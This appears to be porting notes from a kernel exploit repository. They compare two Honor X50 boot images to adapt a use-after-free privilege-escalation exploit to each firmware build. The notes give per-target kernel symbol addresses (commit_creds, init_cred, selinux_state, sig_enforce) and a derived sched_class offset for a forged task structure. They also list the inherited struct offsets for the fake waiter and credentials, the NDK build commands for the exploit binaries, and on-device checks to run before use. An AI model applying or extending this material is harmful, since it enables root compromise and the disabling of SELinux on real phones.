# AN-220 vs TN-230: two boot images compared

Two boot dumps were supplied:

| File | Reported identity | Measured kernel hash |
| :--- | :--- | :--- |
| `boot.img` | Honor X50 **ALI-AN00**, MagicOS **9.0.0.220**, build CNC00E206R9P4 | `5.10.236-android12-9-gf68ed03ce0d2` |
| `boot (2).img` | Honor **ALI-TN00**, MagicOS **9.0.0.230** | `5.10.236-android12-9-g4b262e5255ed` |

Both are 100663296 B, `ANDROID!` header v0, kernel Image at file offset 4096,
51771404 B, arm64 magic `ARM\x64` at `+0x38`. Both yield 140,046 kallsyms symbols
with an identical symbol-name set (0 symbols unique to either side).

**On whether these are "the same boot".** The two Images are not byte-identical,
and their kernel hashes differ. That is not the interesting question and it
does not settle anything: any two builds of the same source, even from the same
tree, produce different hashes. Two different firmware versions on nominally
the same boot family would be expected to differ exactly like this.

What is worth noting is the opposite signal: the symbol-name sets are **exactly
equal** — all 140,046 names present on both, none unique to either side. That is
the signature of two builds from the same source tree, not of two unrelated
kernels. Whether AN and TN ship literally the same boot image cannot be
determined from these dumps; it does not affect this port.

What does affect this port is narrower and directly measured: the `sched_class`
symbol group sits `0x200` apart between the two. That is a fact about addresses,
not about hashes, and it is what forces separate target profiles.

## Symbol comparison

`docs/cmp_boots.py` reports: **11 same / 5 differ / 0 skipped, of 16**.

Identical (11) — every symbol the exploit's core depends on:

```
init_task  init_cred  root_task_group  selinux_state  sig_enforce
g_rscan_skip_flag  nfulnl_logger  loggers  sysctl_bootid  random_table
commit_creds
```

Different (5) — the entire `sched_class` group, all shifted by exactly `0x200`:

| Symbol | AN (9.0.0.220) | TN (9.0.0.230) | Delta |
| :--- | :--- | :--- | :--- |
| `idle_sched_class` | `0x2344920` | `0x2344b20` | `+0x200` |
| `fair_sched_class` | `0x2344a00` | `0x2344c00` | `+0x200` |
| `rt_sched_class` | `0x2344ae0` | `0x2344ce0` | `+0x200` |
| `dl_sched_class` | `0x2344bc0` | `0x2344dc0` | `+0x200` |
| `stop_sched_class` | `0x2344ca0` | `0x2344ea0` | `+0x200` |

Repo-wide: 140,046 shared symbols, **22,554 with differing addresses**. The
symbol *set* is identical; only addresses move. Most of the movement is
compiler-generated statics (`.compoundliteral.*` and friends) shifting around in
`.rodata`/`.data` — normal for two builds of nearby source.

## Why TN is confirmed as 9.0.0.230

The 80 GT `annap-AGT-AN00_9.0.0.230` profile documents its sched_class quartet
in a comment:

```
// = rt_sched_class (idle=0x2344b20, fair=0x2344c00,
// rt=0x2344ce0, dl=0x2344dc0).
```

TN's measured values hit **all four exactly**. AN's are `0x200` lower across the
board. Since that quartet is version-specific in the upstream table, TN landing
on it exactly is strong evidence the TN image really is 9.0.0.230-family.

The 80 GT version table also shows `9.0.0.220SP2 → SLIDE_RT_SCHED_CLASS_OFF
0x2344ce0`, which is the same value TN measures for `rt_sched_class`. Consistent.

## The one value that must differ per target

`SLIDE_RT_SCHED_CLASS_OFF` is what gets stamped into
`fake_task->sched_class` to defuse the `check_class_changed()` →
`->prio_changed` call in the `rt_mutex_setprio` tail. It sits **inside** the
`rt_sched_class` object, 0x500 below the symbol in the 80 GT 9.0.0.230 profile:

```
0x2344ce0 (rt_sched_class) - 0x500 = 0x23447e0  <- 80 GT 9.0.0.230 profile
```

Applying the same delta to each boot:

| Target | `rt_sched_class` | `SLIDE_RT_SCHED_CLASS_OFF` |
| :--- | :--- | :--- |
| TN (9.0.0.230) | `0x2344ce0` | `0x23447e0` (copied from 80 GT 9.0.0.230) |
| AN (9.0.0.220) | `0x2344ae0` | `0x23445e0` (**derived**, `0x2344ae0 - 0x500`) |

Using the 80 GT value unchanged on AN would land `0x200` off, inside whatever
surrounds the class object.

**The AN value is derived, not measured.** The `0x500` relationship is
confirmed on the TN/80 GT side; applying it to AN assumes the internal layout of
`sched_class` is identical across the two builds, which the symbol table cannot
prove. If a run reaches the `fake_task` stamp and then panics inside
`check_class_changed()`, this is the first value to re-derive.

## Profiles in this repo

```
exploit/src/targets/annap-ALI-AN00_9.0.0.220/target.h   measured from boot.img
exploit/src/targets/annap-ALI-TN00_9.0.0.230/target.h   measured from boot (2).img
exploit/src/targets/annap-AGT-AN00_*/target.h           upstream, Honor 80 GT
```

Makefile defaults to `annap-ALI-AN00_9.0.0.220`.

Build both:

```bash
cd exploit
NDK_ROOT=/path/to/android-ndk make PROJECT=annap-ALI-AN00_9.0.0.220 bin
NDK_ROOT=/path/to/android-ndk make PROJECT=annap-ALI-TN00_9.0.0.230 bin
```

## Build verified

With NDK r29 (`android-ndk-r29`, from `E:/Projects/op13-cve-2026-64560/scratch/ndk`,
read-only use), both profiles compile clean — zero errors:

```
build/annap-ALI-AN00_9.0.0.220/bin/exploit            65,104  4a02a10ce775
build/annap-ALI-AN00_9.0.0.220/bin/exploit_static  2,221,696  92dc0067ef10
build/annap-ALI-TN00_9.0.0.230/bin/exploit            65,104  911814d2969a
build/annap-ALI-TN00_9.0.0.230/bin/exploit_static  2,221,696  d8ec92c72aac
```

Confirmed via the preprocessor that each build sees its own value:

```bash
echo '#include "target.h"
MARKER SLIDE_RT_SCHED_CLASS_OFF' | \
  $CC -E -P -x c - -I src/targets/<PROJECT>
# annap-ALI-AN00_9.0.0.220  -> MARKER 0x23445e0ULL
# annap-ALI-TN00_9.0.0.230  -> MARKER 0x23447e0ULL
```

`exploit` is PIE dynamic (65 KB, for `adb shell`); `exploit_static` is fully
static bionic (2.2 MB, self-contained).

### Makefile fix required for Windows hosts

Upstream hardcoded `NDK_TOOLCHAIN` to `.../prebuilt/linux-x86_64`. On a Windows
host the compiler binary still runs, but `--sysroot` then points at a
non-existent path and every libc include fails:

```
src\common.h:12:10: fatal error: 'dirent.h' file not found
```

Now detected instead of assumed:

```make
NDK_HOST_TAG := $(firstword $(foreach t,windows-x86_64 darwin-x86_64 linux-x86_64,\
  $(if $(wildcard $(NDK_PREBUILT)/$(t)),$(t))))
```

`RESOURCE_DIR` is likewise globbed rather than pinned to `lib/clang/21`, which
does not exist in r29.

## What stays unverified

Unchanged from the single-boot analysis, and kallsyms cannot address it — struct
field offsets live in DWARF type info, absent from a vendor `Image`:

| Group | Inherited from | Risk if wrong |
| :--- | :--- | :--- |
| `FAKE_TASK_*` (`pi_blocked_on` at `0x8d0`) | 80 GT 9.0.0.230 | The field the UAF dangles on; silent failure |
| `WAITER_*` / `FAKE_WAITER_*` | 80 GT 9.0.0.230 | Forged waiter fails structural checks |
| `TASK_CRED_OFF` `0x7b8`, `MM_OWNER_OFF` `0x348` | 80 GT 9.0.0.230 | Wrong cred / anchor |
| `SLIDE_MCAST_OPT_DEFAULT` `44` | 80 GT 9.0.0.230 | Race timing |
| `CTL_BOOTID_ENTRY_OFF` `+0x100` in `random_table` | 80 GT 9.0.0.230 | Table base verified; entry offset not |
| `SLIDE_RT_SCHED_CLASS_OFF` (AN side only) | derived | Derived from a `0x500` delta, see above |

`CONFIG_DEBUG_RT_MUTEXES` is off, so 5.10's waiter really is the 80-byte
no-`wake_state`/no-`ww_ctx` shape — that much is config-backed rather than
assumed.

## Version strings are not verifiable from the images

Neither boot contains `MagicOS`, `ALI-AN00`, `ALI-TN00`, or a `build.display.id`
string. The firmware version labels above rest entirely on how the dumps were
described when supplied. The kernel hashes are measured; the version numbers are
not.

Before flashing, confirm on-device:

```bash
adb shell getprop ro.build.display.id
adb shell getprop ro.build.fingerprint
adb shell uname -a          # compare against the -g<hash> above
```

If AN turns out to be a different sublevel than 9.0.0.220, re-extract and
re-diff — the 11 matching symbols are a good sanity signal that a re-extraction
is sound.

## Reproduce the comparison

```bash
# slice both boots
python - <<'PY'
import struct
for src, out in [("boot.img", "an220"), ("boot (2).img", "tn230")]:
    d = open(src, "rb").read()
    ks = struct.unpack_from("<I", d, 8)[0]
    img = d[4096:4096 + ks]
    assert img[0x38:0x3c] == b"ARM\x64"
    open(f"tools/bootimg/{out}/Image", "wb").write(img)
PY

# extract symbols
for t in an220 tn230; do (cd tools/bootimg/$t && ../../bootimg/ksyms Image > kallsyms.txt); done

# compare
python tools/bootimg/cmp_boots.py tools/bootimg/an220/kallsyms.txt \
                            tools/bootimg/tn230/kallsyms.txt
```

`ksyms` is built from `kallsyms.c` (IonStack's `target_generator`, GPL). The
scripts live in `docs/`.